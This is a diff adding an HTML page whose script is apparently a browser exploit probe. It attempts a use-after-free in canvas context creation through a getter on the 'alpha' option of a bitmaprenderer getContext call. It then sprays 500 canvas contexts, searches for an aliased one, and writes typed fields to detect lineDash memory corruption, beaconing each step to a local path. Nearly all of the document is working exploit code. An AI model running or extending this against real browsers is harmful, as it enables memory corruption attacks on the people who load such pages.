@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V957B</title></head>
+<body><pre id="out">V957B — alias field→lineDash corruption oracle (B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){try{new Image().src='/beacon/V957B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1';}catch(e){}}
+function hex8(v){var b=new ArrayBuffer(8),d=new Float64Array(b),u=new Uint8Array(b);d[0]=v;var s='';for(var i=7;i>=0;i--)s+=(u[i]<16?'0':'')+u[i].toString(16);return s;}
+
+async function establishAlias(){
+  bk('BOOT','establish V573-style alias; test if typed-field writes corrupt getLineDash/setLineDash (overlap oracle). step-beaconed; crash=last PRE');
+  // attempt UAF+alias (pattern from V573/V926B family) - simplified: rely on known working trigger style if present? 
+  // Safer: try to reuse a common pattern; if alias not found report and stop.
+  var inner=null;
+  var c=document.createElement('canvas'); c.width=64; c.height=64;
+  var settings={};
+  Object.defineProperty(settings,'alpha',{get:function(){ try{ inner=c.getContext('2d'); }catch(e){} return true; }});
+  try{ c.getContext('bitmaprenderer', settings); }catch(e){ bk('BMR-ERR',String(e&&e.name)); }
+  if(!inner){ bk('NO-INNER',''); return null; }
+  bk('INNER','ok');
+  // spray same-type
+  var spray=[];
+  for(var i=0;i<500;i++){
+    var c2=document.createElement('canvas'); c2.width=64; c2.height=64;
+    var g=c2.getContext('2d');
+    g.lineWidth = 1000 + i; // marker
+    spray.push({c:c2,g:g});
+  }
+  bk('SPRAY','500');
+  // probe alias: find spray ctx whose lineWidth reads back differently when inner writes?
+  var found=-1, alias=null;
+  try{ inner.lineWidth=7777.77; }catch(e){ bk('W1-ERR',String(e)); return null; }
+  for(var i=0;i<spray.length;i++){
+    try{ if(Math.abs(spray[i].g.lineWidth-7777.77)<0.01){ found=i; alias=spray[i].g; break; } }catch(e){}
+  }
+  bk('ALIAS', found>=0?('idx='+found):'MISS');
+  if(!alias) return null;
+  return {inner:inner, alias:alias, spray:spray};
+}
+
+function snapLD(ctx,tag){
+  try{
+    var ld=ctx.getLineDash();
+    bk(tag,'len='+ld.length+'|v0='+ (ld.length?ld[0]:'-') +'|h0='+(ld.length?hex8(ld[0]):'-')+'|lw='+ctx.lineWidth);
+    return ld;
+  }catch(e){ bk(tag+'-ERR',String(e&&e.name)+':'+String(e&&e.message||e).slice(0,120)); return null; }
+}
+
+(async function(){
+  var a=await establishAlias();
+  if(!a){ bk('DONE','no-alias/stop'); say('no alias'); return; }
+  var al=a.alias;
+  // baseline: set known lineDash via alias, read back
+  bk('S0-PRE','setLineDash([11,22,33,44])');
+  try{ al.setLineDash([11,22,33,44]); }catch(e){ bk('S0-SETERR',String(e)); }
+  snapLD(al,'S0');
+  // S1: scribble doubles into various typed fields, observe lineDash
+  var patterns=[
+    ['S1-lw', function(){ al.lineWidth=1.234567890123456e200; }],
+    ['S1-miter', function(){ al.miterLimit=5.4321987654321e150; }],
+    ['S1-alpha', function(){ al.globalAlpha=0.123456789; }],
+    ['S1-lw-tag', function(){ al.lineWidth=0x4142434445464748; }], // integer-as-double (will be coerced)
+  ];
+  // represent pointer-like bits via float64 reinterpret: write as double value whose bits we control?
+  // JS numbers are float64; we can create a double with specific bit pattern via ArrayBuffer view trick on our own buffer,
+  // but assigning to lineWidth takes a number (value). Not the same as writing raw bits into alias memory.
+  // So typed setters coerce; still useful to see if changing state affects vector metadata unexpectedly.
+  for(var i=0;i<patterns.length;i++){
+    bk(patterns[i][0]+'-PRE','');
+    try{ patterns[i][1](); }catch(e){ bk(patterns[i][0]+'-ERR',String(e)); }
+    snapLD(al,patterns[i][0]);
+  }
+  // S2: heavy save/restore cycles then lineDash
+  bk('S2-PRE','save/restore x20');
+  try{ for(var i=0;i<20;i++) al.save(); for(var i=0;i<20;i++) al.restore(); }catch(e){ bk('S2-ERR',String(e)); }
+  snapLD(al,'S2');
+  // S3: re-set lineDash large, read
+  bk('S3-PRE','setLineDash 200');
+  try{ var big=[]; for(var i=0;i<200;i++) big.push(i+0.5); al.setLineDash(big); }catch(e){ bk('S3-SETERR',String(e)); }
+  snapLD(al,'S3');
+  bk('S3-tail','v199='+ (function(){try{var x=al.getLineDash(); return x.length?x[x.length-1]:'-';}catch(e){return 'err';}})());
+  bk('DONE','oracle complete; if lineDash len/values became inconsistent or crashed => overlap/corruption signal; if stable => no observable overlap via typed setters');
+  say('done');
+})();
+</script>
+</body></html>
